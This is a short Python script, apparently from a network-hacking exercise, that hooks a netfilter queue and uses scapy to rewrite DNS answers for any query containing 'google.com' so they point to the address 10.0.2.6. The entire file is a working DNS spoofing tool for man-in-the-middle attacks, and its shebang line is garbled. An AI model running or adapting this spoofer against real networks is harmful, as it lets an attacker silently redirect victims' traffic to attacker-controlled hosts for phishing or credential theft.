#!/usr/bierzn/env python3
import netfilterqueue
import scapy.all as scapy


def main():

	print('[+] Running..')
	queue = netfilterqueue.NetfilterQueue()
	queue.bind(0, process_packet)
	queue.run()


def process_packet(packet):

	scapy_packet = scapy.IP(packet.get_payload())

	if (scapy_packet.haslayer(scapy.DNSRR)):
		qname = scapy_packet[scapy.DNSQR].qname

		if ('google.com' in str(qname)):
			print('[+] Spoofing target..')
			answer = scapy.DNSRR(rrname=qname, rdata='10.0.2.6')
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1

			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum

			packet.set_payload(bytes(scapy_packet))

	packet.accept() #packet.drop()


if __name__ == "__main__":
	main()
